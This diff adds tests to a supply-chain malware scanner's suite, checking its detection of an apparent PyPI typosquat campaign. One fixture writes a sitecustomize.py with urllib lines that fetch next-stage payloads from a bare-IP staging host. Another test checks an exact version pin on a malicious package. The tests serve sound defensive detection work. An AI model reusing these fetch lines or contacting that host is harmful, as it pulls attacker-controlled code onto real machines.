@@ -6147,4 +6147,50 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // =================================================================
+  // openaii PyPI typosquat campaign (September 2026)
+  // =================================================================
+
+  describe("openaii PyPI typosquat campaign (September 2026)", () => {
+    // The campaign plants a .pth file that runs on every Python startup and
+    // pulls its next stage from a bare-IP staging host. The five package names
+    // come from the advisory databases; the atomic indicators come from the
+    // campaign write-up alone and are what these two paths cover.
+    it("flags the staging host and both payload paths", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "sitecustomize.py"),
+        [
+          'import urllib.request',
+          'urllib.request.urlopen("http://167.86.108.190:7788/stage1.py").read()',
+          'urllib.request.urlopen("http://167.86.108.190:7788/.lurves-agent.py").read()',
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP"),
+      ).toBeDefined();
+      const drops = report.findings.filter(
+        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
+      );
+      expect(drops.length).toBeGreaterThanOrEqual(2);
+    });
+
+    // chroma-client is version pinned exactly as the advisory scopes it. PyPI
+    // returns 404 for the project today, but the name could be re-registered,
+    // so any other version must stay clean rather than the pin quietly widening
+    // into a name block.
+    it("blocks chroma-client at the published version only", () => {
+      const feed = getBundledFeed();
+      expect(
+        matchPackageIOC("pypi", "chroma-client", "0.5.7", feed),
+        "the published malicious version must match",
+      ).not.toBeNull();
+      expect(
+        matchPackageIOC("pypi", "chroma-client", "0.5.6", feed),
+        "a version the campaign never published must not match",
+      ).toBeNull();
+    });
+  });
+
 });
